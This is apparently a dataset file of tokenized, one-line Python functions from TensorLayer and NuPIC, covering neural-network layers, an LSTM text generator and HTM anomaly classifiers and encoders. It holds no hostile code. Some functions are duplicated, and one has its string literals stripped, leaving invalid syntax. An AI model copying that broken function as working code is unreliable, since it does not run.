def print_params ( self , details = True , session = None ) : for i , p in enumerate ( self . all_params ) : if details : try : val = p . eval ( session = session ) logging . info ( "  param {:3}: {:20} {:15}    {} (mean: {:<18}, median: {:<18}, std: {:<18})   " . format ( i , p . name , str ( val . shape ) , p . dtype . name , val . mean ( ) , np . median ( val ) , val . std ( ) ) ) except Exception as e : logging . info ( str ( e ) ) raise Exception ( "Hint: print params details after tl.layers.initialize_global_variables(sess) " "or use network.print_params(False)." ) else : logging . info ( "  param {:3}: {:20} {:15}    {}" . format ( i , p . name , str ( p . get_shape ( ) ) , p . dtype . name ) ) logging . info ( "  num of params: %d" % self . count_params ( ) )
def print_layers ( self ) : for i , layer in enumerate ( self . all_layers ) : # logging.info("  layer %d: %s" % (i, str(layer))) logging . info ( "  layer {:3}: {:20} {:15}    {}" . format ( i , layer . name , str ( layer . get_shape ( ) ) , layer . dtype . name ) )
def count_params ( self ) : n_params = 0 for _i , p in enumerate ( self . all_params ) : n = 1 # for s in p.eval().shape: for s in p . get_shape ( ) : try : s = int ( s ) except Exception : s = 1 if s : n = n * s n_params = n_params + n return n_params
def get_all_params ( self , session = None ) : _params = [ ] for p in self . all_params : if session is None : _params . append ( p . eval ( ) ) else : _params . append ( session . run ( p ) ) return _params
def _get_init_args ( self , skip = 4 ) : stack = inspect . stack ( ) if len ( stack ) < skip + 1 : raise ValueError ( "The length of the inspection stack is shorter than the requested start position." ) args , _ , _ , values = inspect . getargvalues ( stack [ skip ] [ 0 ] ) params = { } for arg in args : # some args dont need to be saved into the graph. e.g. the input placeholder if values [ arg ] is not None and arg not in [ 'self' , 'prev_layer' , 'inputs' ] : val = values [ arg ] # change function (e.g. act) into dictionary of module path and function name if inspect . isfunction ( val ) : params [ arg ] = { "module_path" : val . __module__ , "func_name" : val . __name__ } # ignore more args e.g. TF class elif arg . endswith ( 'init' ) : continue # for other data type, save them directly else : params [ arg ] = val return params
def _bias_scale ( x , b , data_format ) : if data_format == 'NHWC' : return x * b elif data_format == 'NCHW' : return x * _to_channel_first_bias ( b ) else : raise ValueError ( 'invalid data_format: %s' % data_format )
def _bias_add ( x , b , data_format ) : if data_format == 'NHWC' : return tf . add ( x , b ) elif data_format == 'NCHW' : return tf . add ( x , _to_channel_first_bias ( b ) ) else : raise ValueError ( 'invalid data_format: %s' % data_format )
def batch_normalization ( x , mean , variance , offset , scale , variance_epsilon , data_format , name = None ) : with ops . name_scope ( name , 'batchnorm' , [ x , mean , variance , scale , offset ] ) : inv = math_ops . rsqrt ( variance + variance_epsilon ) if scale is not None : inv *= scale a = math_ops . cast ( inv , x . dtype ) b = math_ops . cast ( offset - mean * inv if offset is not None else - mean * inv , x . dtype ) # Return a * x + b with customized data_format. # Currently TF doesn't have bias_scale, and tensorRT has bug in converting tf.nn.bias_add # So we reimplemted them to allow make the model work with tensorRT. df = { 'channels_first' : 'NCHW' , 'channels_last' : 'NHWC' } return _bias_add ( _bias_scale ( x , a , df [ data_format ] ) , b , df [ data_format ] )
def compute_alpha ( x ) : threshold = _compute_threshold ( x ) alpha1_temp1 = tf . where ( tf . greater ( x , threshold ) , x , tf . zeros_like ( x , tf . float32 ) ) alpha1_temp2 = tf . where ( tf . less ( x , - threshold ) , x , tf . zeros_like ( x , tf . float32 ) ) alpha_array = tf . add ( alpha1_temp1 , alpha1_temp2 , name = None ) alpha_array_abs = tf . abs ( alpha_array ) alpha_array_abs1 = tf . where ( tf . greater ( alpha_array_abs , 0 ) , tf . ones_like ( alpha_array_abs , tf . float32 ) , tf . zeros_like ( alpha_array_abs , tf . float32 ) ) alpha_sum = tf . reduce_sum ( alpha_array_abs ) n = tf . reduce_sum ( alpha_array_abs1 ) alpha = tf . div ( alpha_sum , n ) return alpha
def ternary_operation ( x ) : g = tf . get_default_graph ( ) with g . gradient_override_map ( { "Sign" : "Identity" } ) : threshold = _compute_threshold ( x ) x = tf . sign ( tf . add ( tf . sign ( tf . add ( x , threshold ) ) , tf . sign ( tf . add ( x , - threshold ) ) ) ) return x
def _add_deprecated_function_notice_to_docstring ( doc , date , instructions ) : if instructions : deprecation_message = % ( ( 'in a future version' if date is None else ( 'after %s' % date ) ) , instructions ) else : deprecation_message = % ( ( 'in a future version' if date is None else ( 'after %s' % date ) ) ) main_text = [ deprecation_message ] return _add_notice_to_docstring ( doc , 'DEPRECATED FUNCTION' , main_text )
def _add_notice_to_docstring ( doc , no_doc_str , notice ) : if not doc : lines = [ no_doc_str ] else : lines = _normalize_docstring ( doc ) . splitlines ( ) notice = [ '' ] + notice if len ( lines ) > 1 : # Make sure that we keep our distance from the main body if lines [ 1 ] . strip ( ) : notice . append ( '' ) lines [ 1 : 1 ] = notice else : lines += notice return '\n' . join ( lines )
def word_to_id ( self , word ) : if word in self . _vocab : return self . _vocab [ word ] else : return self . _unk_id
def word_to_id ( self , word ) : if word in self . vocab : return self . vocab [ word ] else : return self . unk_id
def id_to_word ( self , word_id ) : if word_id >= len ( self . reverse_vocab ) : return self . reverse_vocab [ self . unk_id ] else : return self . reverse_vocab [ word_id ]
def main_lstm_generate_text ( ) : # rnn model and update  (describtion: see tutorial_ptb_lstm.py) init_scale = 0.1 learning_rate = 1.0 max_grad_norm = 5 sequence_length = 20 hidden_size = 200 max_epoch = 4 max_max_epoch = 100 lr_decay = 0.9 batch_size = 20 top_k_list = [ 1 , 3 , 5 , 10 ] print_length = 30 model_file_name = "model_generate_text.npz" # ===== Prepare Data words = customized_read_words ( input_fpath = "data/trump/trump_text.txt" ) vocab = tl . nlp . create_vocab ( [ words ] , word_counts_output_file = 'vocab.txt' , min_word_count = 1 ) vocab = tl . nlp . Vocabulary ( 'vocab.txt' , unk_word = "<UNK>" ) vocab_size = vocab . unk_id + 1 train_data = [ vocab . word_to_id ( word ) for word in words ] # Set the seed to generate sentence. seed = "it is a" # seed = basic_clean_str(seed).split() seed = nltk . tokenize . word_tokenize ( seed ) print ( 'seed : %s' % seed ) sess = tf . InteractiveSession ( ) # ===== Define model input_data = tf . placeholder ( tf . int32 , [ batch_size , sequence_length ] ) targets = tf . placeholder ( tf . int32 , [ batch_size , sequence_length ] ) # Testing (Evaluation), for generate text input_data_test = tf . placeholder ( tf . int32 , [ 1 , 1 ] ) def inference ( x , is_train , sequence_length , reuse = None ) : print ( "\nsequence_length: %d, is_train: %s, reuse: %s" % ( sequence_length , is_train , reuse ) ) rnn_init = tf . random_uniform_initializer ( - init_scale , init_scale ) with tf . variable_scope ( "model" , reuse = reuse ) : network = EmbeddingInputlayer ( x , vocab_size , hidden_size , rnn_init , name = 'embedding' ) network = RNNLayer ( network , cell_fn = tf . contrib . rnn . BasicLSTMCell , cell_init_args = { 'forget_bias' : 0.0 , 'state_is_tuple' : True } , n_hidden = hidden_size , initializer = rnn_init , n_steps = sequence_length , return_last = False , return_seq_2d = True , name = 'lstm1' ) lstm1 = network network = DenseLayer ( network , vocab_size , W_init = rnn_init , b_init = rnn_init , act = None , name = 'output' ) return network , lstm1 # Inference for Training network , lstm1 = inference ( input_data , is_train = True , sequence_length = sequence_length , reuse = None ) # Inference for generate text, sequence_length=1 network_test , lstm1_test = inference ( input_data_test , is_train = False , sequence_length = 1 , reuse = True ) y_linear = network_test . outputs y_soft = tf . nn . softmax ( y_linear ) # y_id = tf.argmax(tf.nn.softmax(y), 1) # ===== Define train ops def loss_fn ( outputs , targets , batch_size , sequence_length ) : # Returns the cost function of Cross-entropy of two sequences, implement # softmax internally. # outputs : 2D tensor [n_examples, n_outputs] # targets : 2D tensor [n_examples, n_outputs] # n_examples = batch_size * sequence_length # so # cost is the averaged cost of each mini-batch (concurrent process). loss = tf . contrib . legacy_seq2seq . sequence_loss_by_example ( [ outputs ] , [ tf . reshape ( targets , [ - 1 ] ) ] , [ tf . ones ( [ batch_size * sequence_length ] ) ] ) cost = tf . reduce_sum ( loss ) / batch_size return cost # Cost for Training cost = loss_fn ( network . outputs , targets , batch_size , sequence_length ) # Truncated Backpropagation for training with tf . variable_scope ( 'learning_rate' ) : lr = tf . Variable ( 0.0 , trainable = False ) # You can get all trainable parameters as follow. # tvars = tf.trainable_variables() # Alternatively, you can specify the parameters for training as follw. #  tvars = network.all_params      $ all parameters #  tvars = network.all_params[1:]  $ parameters except embedding matrix # Train the whole network. tvars = network . all_params grads , _ = tf . clip_by_global_norm ( tf . gradients ( cost , tvars ) , max_grad_norm ) optimizer = tf . train . GradientDescentOptimizer ( lr ) train_op = optimizer . apply_gradients ( zip ( grads , tvars ) ) # ===== Training sess . run ( tf . global_variables_initializer ( ) ) print ( "\nStart learning a model to generate text" ) for i in range ( max_max_epoch ) : # decrease the learning_rate after ``max_epoch``, by multipling lr_decay. new_lr_decay = lr_decay ** max ( i - max_epoch , 0.0 ) sess . run ( tf . assign ( lr , learning_rate * new_lr_decay ) ) print ( "Epoch: %d/%d Learning rate: %.8f" % ( i + 1 , max_max_epoch , sess . run ( lr ) ) ) epoch_size = ( ( len ( train_data ) // batch_size ) - 1 ) // sequence_length start_time = time . time ( ) costs = 0.0 iters = 0 # reset all states at the begining of every epoch state1 = tl . layers . initialize_rnn_state ( lstm1 . initial_state ) for step , ( x , y ) in enumerate ( tl . iterate . ptb_iterator ( train_data , batch_size , sequence_length ) ) : _cost , state1 , _ = sess . run ( [ cost , lstm1 . final_state , train_op ] , feed_dict = { input_data : x , targets : y , lstm1 . initial_state : state1 } ) costs += _cost iters += sequence_length if step % ( epoch_size // 10 ) == 1 : print ( "%.3f perplexity: %.3f speed: %.0f wps" % ( step * 1.0 / epoch_size , np . exp ( costs / iters ) , iters * batch_size / ( time . time ( ) - start_time ) ) ) train_perplexity = np . exp ( costs / iters ) # print("Epoch: %d Train Perplexity: %.3f" % (i + 1, train_perplexity)) print ( "Epoch: %d/%d Train Perplexity: %.3f" % ( i + 1 , max_max_epoch , train_perplexity ) ) # for diversity in diversity_list: # testing: sample from top k words for top_k in top_k_list : # Testing, generate some text from a given seed. state1 = tl . layers . initialize_rnn_state ( lstm1_test . initial_state ) # state2 = tl.layers.initialize_rnn_state(lstm2_test.initial_state) outs_id = [ vocab . word_to_id ( w ) for w in seed ] # feed the seed to initialize the state for generation. for ids in outs_id [ : - 1 ] : a_id = np . asarray ( ids ) . reshape ( 1 , 1 ) state1 = sess . run ( [ lstm1_test . final_state ] , feed_dict = { input_data_test : a_id , lstm1_test . initial_state : state1 } ) # feed the last word in seed, and start to generate sentence. a_id = outs_id [ - 1 ] for _ in range ( print_length ) : a_id = np . asarray ( a_id ) . reshape ( 1 , 1 ) out , state1 = sess . run ( [ y_soft , lstm1_test . final_state ] , feed_dict = { input_data_test : a_id , lstm1_test . initial_state : state1 } ) # Without sampling # a_id = np.argmax(out[0]) # Sample from all words, if vocab_size is large, # this may have numeric error. # a_id = tl.nlp.sample(out[0], diversity) # Sample from the top k words. a_id = tl . nlp . sample_top ( out [ 0 ] , top_k = top_k ) outs_id . append ( a_id ) sentence = [ vocab . id_to_word ( w ) for w in outs_id ] sentence = " " . join ( sentence ) # print(diversity, ':', sentence) print ( top_k , ':' , sentence ) print ( "Save model" ) tl . files . save_npz ( network_test . all_params , name = model_file_name )
def _getLogger ( cls , logLevel = None ) : logger = logging . getLogger ( "." . join ( [ 'com.numenta' , _MODULE_NAME , cls . __name__ ] ) ) if logLevel is not None : logger . setLevel ( logLevel ) return logger
def close ( self ) : self . _logger . info ( "Closing" ) if self . _conn is not None : self . _conn . close ( ) self . _conn = None else : self . _logger . warning ( "close() called, but connection policy was alredy closed" ) return
def close ( self ) : self . _logger . info ( "Closing" ) if self . _pool is not None : self . _pool . close ( ) self . _pool = None else : self . _logger . warning ( "close() called, but connection policy was alredy closed" ) return
def close ( self ) : self . _logger . info ( "Closing" ) if self . _opened : self . _opened = False else : self . _logger . warning ( "close() called, but connection policy was alredy closed" ) return
def _classifyState ( self , state ) : # Record is before wait period do not classifiy if state . ROWID < self . getParameter ( 'trainRecords' ) : if not state . setByUser : state . anomalyLabel = [ ] self . _deleteRecordsFromKNN ( [ state ] ) return label = KNNAnomalyClassifierRegion . AUTO_THRESHOLD_CLASSIFIED_LABEL autoLabel = label + KNNAnomalyClassifierRegion . AUTO_TAG # Update the label based on classifications newCategory = self . _recomputeRecordFromKNN ( state ) labelList = self . _categoryToLabelList ( newCategory ) if state . setByUser : if label in state . anomalyLabel : state . anomalyLabel . remove ( label ) if autoLabel in state . anomalyLabel : state . anomalyLabel . remove ( autoLabel ) labelList . extend ( state . anomalyLabel ) # Add threshold classification label if above threshold, else if # classified to add the auto threshold classification. if state . anomalyScore >= self . getParameter ( 'anomalyThreshold' ) : labelList . append ( label ) elif label in labelList : ind = labelList . index ( label ) labelList [ ind ] = autoLabel # Make all entries unique labelList = list ( set ( labelList ) ) # If both above threshold and auto classified above - remove auto label if label in labelList and autoLabel in labelList : labelList . remove ( autoLabel ) if state . anomalyLabel == labelList : return # Update state's labeling state . anomalyLabel = labelList # Update KNN Classifier with new labeling if state . anomalyLabel == [ ] : self . _deleteRecordsFromKNN ( [ state ] ) else : self . _addRecordToKNN ( state )
def _addRecordToKNN ( self , record ) : knn = self . _knnclassifier . _knn prototype_idx = self . _knnclassifier . getParameter ( 'categoryRecencyList' ) category = self . _labelListToCategoryNumber ( record . anomalyLabel ) # If record is already in the classifier, overwrite its labeling if record . ROWID in prototype_idx : knn . prototypeSetCategory ( record . ROWID , category ) return # Learn this pattern in the knn pattern = self . _getStateAnomalyVector ( record ) rowID = record . ROWID knn . learn ( pattern , category , rowID = rowID )
def _recomputeRecordFromKNN ( self , record ) : inputs = { "categoryIn" : [ None ] , "bottomUpIn" : self . _getStateAnomalyVector ( record ) , } outputs = { "categoriesOut" : numpy . zeros ( ( 1 , ) ) , "bestPrototypeIndices" : numpy . zeros ( ( 1 , ) ) , "categoryProbabilitiesOut" : numpy . zeros ( ( 1 , ) ) } # Only use points before record to classify and after the wait period. classifier_indexes = numpy . array ( self . _knnclassifier . getParameter ( 'categoryRecencyList' ) ) valid_idx = numpy . where ( ( classifier_indexes >= self . getParameter ( 'trainRecords' ) ) & ( classifier_indexes < record . ROWID ) ) [ 0 ] . tolist ( ) if len ( valid_idx ) == 0 : return None self . _knnclassifier . setParameter ( 'inferenceMode' , None , True ) self . _knnclassifier . setParameter ( 'learningMode' , None , False ) self . _knnclassifier . compute ( inputs , outputs ) self . _knnclassifier . setParameter ( 'learningMode' , None , True ) classifier_distances = self . _knnclassifier . getLatestDistances ( ) valid_distances = classifier_distances [ valid_idx ] if valid_distances . min ( ) <= self . _classificationMaxDist : classifier_indexes_prev = classifier_indexes [ valid_idx ] rowID = classifier_indexes_prev [ valid_distances . argmin ( ) ] indexID = numpy . where ( classifier_indexes == rowID ) [ 0 ] [ 0 ] category = self . _knnclassifier . getCategoryList ( ) [ indexID ] return category return None
def _categoryToLabelList ( self , category ) : if category is None : return [ ] labelList = [ ] labelNum = 0 while category > 0 : if category % 2 == 1 : labelList . append ( self . saved_categories [ labelNum ] ) labelNum += 1 category = category >> 1 return labelList
def _getStateAnomalyVector ( self , state ) : vector = numpy . zeros ( self . _anomalyVectorLength ) vector [ state . anomalyVector ] = 1 return vector
def match ( self , record ) : for field , meta in self . filterDict . iteritems ( ) : index = meta [ 'index' ] categories = meta [ 'categories' ] for category in categories : # Record might be blank, handle this if not record : continue if record [ index ] . find ( category ) != - 1 : return True # None of the categories were found in this record return False
def _updateBoostFactorsGlobal ( self ) : # When global inhibition is enabled, the target activation level is # the sparsity of the spatial pooler if ( self . _localAreaDensity > 0 ) : targetDensity = self . _localAreaDensity else : inhibitionArea = ( ( 2 * self . _inhibitionRadius + 1 ) ** self . _columnDimensions . size ) inhibitionArea = min ( self . _numColumns , inhibitionArea ) targetDensity = float ( self . _numActiveColumnsPerInhArea ) / inhibitionArea targetDensity = min ( targetDensity , 0.5 ) self . _boostFactors = numpy . exp ( ( targetDensity - self . _activeDutyCycles ) * self . _boostStrength )
def _updateBoostFactorsLocal ( self ) : # Determine the target activation level for each column # The targetDensity is the average activeDutyCycles of the neighboring # columns of each column. targetDensity = numpy . zeros ( self . _numColumns , dtype = realDType ) for i in xrange ( self . _numColumns ) : maskNeighbors = self . _getColumnNeighborhood ( i ) targetDensity [ i ] = numpy . mean ( self . _activeDutyCycles [ maskNeighbors ] ) self . _boostFactors = numpy . exp ( ( targetDensity - self . _activeDutyCycles ) * self . _boostStrength )
def _seed ( self , seed = - 1 ) : if seed != - 1 : self . _random = NupicRandom ( seed ) else : self . _random = NupicRandom ( )
def getInputNames ( self ) : inputs = self . getSpec ( ) . inputs return [ inputs . getByIndex ( i ) [ 0 ] for i in xrange ( inputs . getCount ( ) ) ]
def getOutputNames ( self ) : outputs = self . getSpec ( ) . outputs return [ outputs . getByIndex ( i ) [ 0 ] for i in xrange ( outputs . getCount ( ) ) ]
def isSprintCompleted ( self , sprintIdx ) : numExistingSprints = len ( self . _state [ 'sprints' ] ) if sprintIdx >= numExistingSprints : return False return ( self . _state [ 'sprints' ] [ sprintIdx ] [ 'status' ] == 'completed' )
def createEncoder ( ) : consumption_encoder = ScalarEncoder ( 21 , 0.0 , 100.0 , n = 50 , name = "consumption" , clipInput = True ) time_encoder = DateEncoder ( timeOfDay = ( 21 , 9.5 ) , name = "timestamp_timeOfDay" ) encoder = MultiEncoder ( ) encoder . addEncoder ( "consumption" , consumption_encoder ) encoder . addEncoder ( "timestamp" , time_encoder ) return encoder
def __validateExperimentControl ( self , control ) : # Validate task list taskList = control . get ( 'tasks' , None ) if taskList is not None : taskLabelsList = [ ] for task in taskList : validateOpfJsonValue ( task , "opfTaskSchema.json" ) validateOpfJsonValue ( task [ 'taskControl' ] , "opfTaskControlSchema.json" ) taskLabel = task [ 'taskLabel' ] assert isinstance ( taskLabel , types . StringTypes ) , "taskLabel type: %r" % type ( taskLabel ) assert len ( taskLabel ) > 0 , "empty string taskLabel not is allowed" taskLabelsList . append ( taskLabel . lower ( ) ) taskLabelDuplicates = filter ( lambda x : taskLabelsList . count ( x ) > 1 , taskLabelsList ) assert len ( taskLabelDuplicates ) == 0 , "Duplcate task labels are not allowed: %s" % taskLabelDuplicates return
def rUpdate ( original , updates ) : # Keep a list of the sub-dictionaries that need to be updated to avoid having # to use recursion (which could fail for dictionaries with a lot of nesting. dictPairs = [ ( original , updates ) ] while len ( dictPairs ) > 0 : original , updates = dictPairs . pop ( ) for k , v in updates . iteritems ( ) : if k in original and isinstance ( original [ k ] , dict ) and isinstance ( v , dict ) : dictPairs . append ( ( original [ k ] , v ) ) else : original [ k ] = v
def _seed ( self , seed = - 1 ) : if seed != - 1 : self . random = NupicRandom ( seed ) else : self . random = NupicRandom ( )
def getScalars ( self , input ) : if input == SENTINEL_VALUE_FOR_MISSING_DATA : return numpy . array ( [ 0 ] ) index = self . categoryToIndex . get ( input , None ) if index is None : if self . _learningEnabled : self . _addCategory ( input ) index = self . ncategories - 1 else : # if not found, we encode category 0 index = 0 return numpy . array ( [ index ] )
def decode ( self , encoded , parentFieldName = '' ) : assert ( encoded [ 0 : self . n ] <= 1.0 ) . all ( ) resultString = "" resultRanges = [ ] overlaps = ( self . sdrs * encoded [ 0 : self . n ] ) . sum ( axis = 1 ) if self . verbosity >= 2 : print "Overlaps for decoding:" for i in xrange ( 0 , self . ncategories ) : print "%d %s" % ( overlaps [ i ] , self . categories [ i ] ) matchingCategories = ( overlaps > self . thresholdOverlap ) . nonzero ( ) [ 0 ] for index in matchingCategories : if resultString != "" : resultString += " " resultString += str ( self . categories [ index ] ) resultRanges . append ( [ int ( index ) , int ( index ) ] ) if parentFieldName != '' : fieldName = "%s.%s" % ( parentFieldName , self . name ) else : fieldName = self . name return ( { fieldName : ( resultRanges , resultString ) } , [ fieldName ] )
def getBucketInfo ( self , buckets ) : if self . ncategories == 0 : return 0 topDownMappingM = self . _getTopDownMapping ( ) categoryIndex = buckets [ 0 ] category = self . categories [ categoryIndex ] encoding = topDownMappingM . getRow ( categoryIndex ) return [ EncoderResult ( value = category , scalar = categoryIndex , encoding = encoding ) ]
def topDownCompute ( self , encoded ) : if self . ncategories == 0 : return 0 topDownMappingM = self . _getTopDownMapping ( ) categoryIndex = topDownMappingM . rightVecProd ( encoded ) . argmax ( ) category = self . categories [ categoryIndex ] encoding = topDownMappingM . getRow ( categoryIndex ) return EncoderResult ( value = category , scalar = categoryIndex , encoding = encoding )
def getScalarNames ( self , parentFieldName = '' ) : names = [ ] # This forms a name which is the concatenation of the parentFieldName #   passed in and the encoder's own name. def _formFieldName ( encoder ) : if parentFieldName == '' : return encoder . name else : return '%s.%s' % ( parentFieldName , encoder . name ) # ------------------------------------------------------------------------- # Get the scalar values for each sub-field if self . seasonEncoder is not None : names . append ( _formFieldName ( self . seasonEncoder ) ) if self . dayOfWeekEncoder is not None : names . append ( _formFieldName ( self . dayOfWeekEncoder ) ) if self . customDaysEncoder is not None : names . append ( _formFieldName ( self . customDaysEncoder ) ) if self . weekendEncoder is not None : names . append ( _formFieldName ( self . weekendEncoder ) ) if self . holidayEncoder is not None : names . append ( _formFieldName ( self . holidayEncoder ) ) if self . timeOfDayEncoder is not None : names . append ( _formFieldName ( self . timeOfDayEncoder ) ) return names
def getEncodedValues ( self , input ) : if input == SENTINEL_VALUE_FOR_MISSING_DATA : return numpy . array ( [ None ] ) assert isinstance ( input , datetime . datetime ) values = [ ] # ------------------------------------------------------------------------- # Get the scalar values for each sub-field timetuple = input . timetuple ( ) timeOfDay = timetuple . tm_hour + float ( timetuple . tm_min ) / 60.0 if self . seasonEncoder is not None : dayOfYear = timetuple . tm_yday # input.timetuple() computes the day of year 1 based, so convert to 0 based values . append ( dayOfYear - 1 ) if self . dayOfWeekEncoder is not None : dayOfWeek = timetuple . tm_wday + timeOfDay / 24.0 values . append ( dayOfWeek ) if self . weekendEncoder is not None : # saturday, sunday or friday evening if timetuple . tm_wday == 6 or timetuple . tm_wday == 5 or ( timetuple . tm_wday == 4 and timeOfDay > 18 ) : weekend = 1 else : weekend = 0 values . append ( weekend ) if self . customDaysEncoder is not None : if timetuple . tm_wday in self . customDays : customDay = 1 else : customDay = 0 values . append ( customDay ) if self . holidayEncoder is not None : # A "continuous" binary value. = 1 on the holiday itself and smooth ramp #  0->1 on the day before the holiday and 1->0 on the day after the holiday. # Currently the only holiday we know about is December 25 # holidays is a list of holidays that occur on a fixed date every year if len ( self . holidays ) == 0 : holidays = [ ( 12 , 25 ) ] else : holidays = self . holidays val = 0 for h in holidays : # hdate is midnight on the holiday if len ( h ) == 3 : hdate = datetime . datetime ( h [ 0 ] , h [ 1 ] , h [ 2 ] , 0 , 0 , 0 ) else : hdate = datetime . datetime ( timetuple . tm_year , h [ 0 ] , h [ 1 ] , 0 , 0 , 0 ) if input > hdate : diff = input - hdate if diff . days == 0 : # return 1 on the holiday itself val = 1 break elif diff . days == 1 : # ramp smoothly from 1 -> 0 on the next day val = 1.0 - ( float ( diff . seconds ) / 86400 ) break else : diff = hdate - input if diff . days == 0 : # ramp smoothly from 0 -> 1 on the previous day val = 1.0 - ( float ( diff . seconds ) / 86400 ) values . append ( val ) if self . timeOfDayEncoder is not None : values . append ( timeOfDay ) return values
def getBucketIndices ( self , input ) : if input == SENTINEL_VALUE_FOR_MISSING_DATA : # Encoder each sub-field return [ None ] * len ( self . encoders ) else : assert isinstance ( input , datetime . datetime ) # Get the scalar values for each sub-field scalars = self . getScalars ( input ) # Encoder each sub-field result = [ ] for i in xrange ( len ( self . encoders ) ) : ( name , encoder , offset ) = self . encoders [ i ] result . extend ( encoder . getBucketIndices ( scalars [ i ] ) ) return result
def encodeIntoArray ( self , input , output ) : if input == SENTINEL_VALUE_FOR_MISSING_DATA : output [ 0 : ] = 0 else : if not isinstance ( input , datetime . datetime ) : raise ValueError ( "Input is type %s, expected datetime. Value: %s" % ( type ( input ) , str ( input ) ) ) # Get the scalar values for each sub-field scalars = self . getScalars ( input ) # Encoder each sub-field for i in xrange ( len ( self . encoders ) ) : ( name , encoder , offset ) = self . encoders [ i ] encoder . encodeIntoArray ( scalars [ i ] , output [ offset : ] )
def getSpec ( cls ) : spec = { "description" : IdentityRegion . __doc__ , "singleNodeOnly" : True , "inputs" : { "in" : { "description" : "The input vector." , "dataType" : "Real32" , "count" : 0 , "required" : True , "regionLevel" : False , "isDefaultInput" : True , "requireSplitterMap" : False } , } , "outputs" : { "out" : { "description" : "A copy of the input vector." , "dataType" : "Real32" , "count" : 0 , "regionLevel" : True , "isDefaultOutput" : True } , } , "parameters" : { "dataWidth" : { "description" : "Size of inputs" , "accessMode" : "Read" , "dataType" : "UInt32" , "count" : 1 , "constraints" : "" } , } , } return spec
def _addRecordToKNN ( self , record ) : classifier = self . htm_prediction_model . _getAnomalyClassifier ( ) knn = classifier . getSelf ( ) . _knn prototype_idx = classifier . getSelf ( ) . getParameter ( 'categoryRecencyList' ) category = self . _labelListToCategoryNumber ( record . anomalyLabel ) # If record is already in the classifier, overwrite its labeling if record . ROWID in prototype_idx : knn . prototypeSetCategory ( record . ROWID , category ) return # Learn this pattern in the knn pattern = self . _getStateAnomalyVector ( record ) rowID = record . ROWID knn . learn ( pattern , category , rowID = rowID )
def _recomputeRecordFromKNN ( self , record ) : inputs = { "categoryIn" : [ None ] , "bottomUpIn" : self . _getStateAnomalyVector ( record ) , } outputs = { "categoriesOut" : numpy . zeros ( ( 1 , ) ) , "bestPrototypeIndices" : numpy . zeros ( ( 1 , ) ) , "categoryProbabilitiesOut" : numpy . zeros ( ( 1 , ) ) } # Run inference only to capture state before learning classifier = self . htm_prediction_model . _getAnomalyClassifier ( ) knn = classifier . getSelf ( ) . _knn # Only use points before record to classify and after the wait period. classifier_indexes = numpy . array ( classifier . getSelf ( ) . getParameter ( 'categoryRecencyList' ) ) valid_idx = numpy . where ( ( classifier_indexes >= self . _autoDetectWaitRecords ) & ( classifier_indexes < record . ROWID ) ) [ 0 ] . tolist ( ) if len ( valid_idx ) == 0 : return None classifier . setParameter ( 'inferenceMode' , True ) classifier . setParameter ( 'learningMode' , False ) classifier . getSelf ( ) . compute ( inputs , outputs ) classifier . setParameter ( 'learningMode' , True ) classifier_distances = classifier . getSelf ( ) . getLatestDistances ( ) valid_distances = classifier_distances [ valid_idx ] if valid_distances . min ( ) <= self . _classificationMaxDist : classifier_indexes_prev = classifier_indexes [ valid_idx ] rowID = classifier_indexes_prev [ valid_distances . argmin ( ) ] indexID = numpy . where ( classifier_indexes == rowID ) [ 0 ] [ 0 ] category = classifier . getSelf ( ) . getCategoryList ( ) [ indexID ] return category return None
def compute ( self ) : result = self . _constructClassificationRecord ( ) # Classify this point after waiting the classification delay if result . ROWID >= self . _autoDetectWaitRecords : self . _updateState ( result ) # Save new classification record and keep history as moving window self . saved_states . append ( result ) if len ( self . saved_states ) > self . _history_length : self . saved_states . pop ( 0 ) return result
def setAutoDetectWaitRecords ( self , waitRecords ) : if not isinstance ( waitRecords , int ) : raise HTMPredictionModelInvalidArgument ( "Invalid argument type \'%s\'. WaitRecord " "must be a number." % ( type ( waitRecords ) ) ) if len ( self . saved_states ) > 0 and waitRecords < self . saved_states [ 0 ] . ROWID : raise HTMPredictionModelInvalidArgument ( "Invalid value. autoDetectWaitRecord value " "must be valid record within output stream. Current minimum ROWID in " "output stream is %d." % ( self . saved_states [ 0 ] . ROWID ) ) self . _autoDetectWaitRecords = waitRecords # Update all the states in the classifier's cache for state in self . saved_states : self . _updateState ( state )
def _allocateSpatialFDR ( self , rfInput ) : if self . _sfdr : return # Retrieve the necessary extra arguments that were handled automatically autoArgs = dict ( ( name , getattr ( self , name ) ) for name in self . _spatialArgNames ) # Instantiate the spatial pooler class. if ( ( self . SpatialClass == CPPSpatialPooler ) or ( self . SpatialClass == PYSpatialPooler ) ) : autoArgs [ 'columnDimensions' ] = [ self . columnCount ] autoArgs [ 'inputDimensions' ] = [ self . inputWidth ] autoArgs [ 'potentialRadius' ] = self . inputWidth self . _sfdr = self . SpatialClass ( * * autoArgs )
def _compute ( self , inputs , outputs ) : #if self.topDownMode and (not 'topDownIn' in inputs): #  raise RuntimeError("The input topDownIn must be linked in if " #                     "topDownMode is True") if self . _sfdr is None : raise RuntimeError ( "Spatial pooler has not been initialized" ) if not self . topDownMode : # # BOTTOM-UP compute # self . _iterations += 1 # Get our inputs into numpy arrays buInputVector = inputs [ 'bottomUpIn' ] resetSignal = False if 'resetIn' in inputs : assert len ( inputs [ 'resetIn' ] ) == 1 resetSignal = inputs [ 'resetIn' ] [ 0 ] != 0 # Perform inference and/or learning rfOutput = self . _doBottomUpCompute ( rfInput = buInputVector . reshape ( ( 1 , buInputVector . size ) ) , resetSignal = resetSignal ) outputs [ 'bottomUpOut' ] [ : ] = rfOutput . flat else : # # TOP-DOWN inference # topDownIn = inputs . get ( 'topDownIn' , None ) spatialTopDownOut , temporalTopDownOut = self . _doTopDownInfer ( topDownIn ) outputs [ 'spatialTopDownOut' ] [ : ] = spatialTopDownOut if temporalTopDownOut is not None : outputs [ 'temporalTopDownOut' ] [ : ] = temporalTopDownOut # OBSOLETE outputs [ 'anomalyScore' ] [ : ] = 0
def _initEphemerals ( self ) : if hasattr ( self , '_sfdr' ) and self . _sfdr : self . _spatialPoolerOutput = numpy . zeros ( self . columnCount , dtype = GetNTAReal ( ) ) else : self . _spatialPoolerOutput = None # Will be filled in initInNetwork # Direct logging support (faster than node watch) self . _fpLogSPInput = None self . _fpLogSP = None self . _fpLogSPDense = None self . logPathInput = "" self . logPathOutput = "" self . logPathOutputDense = ""
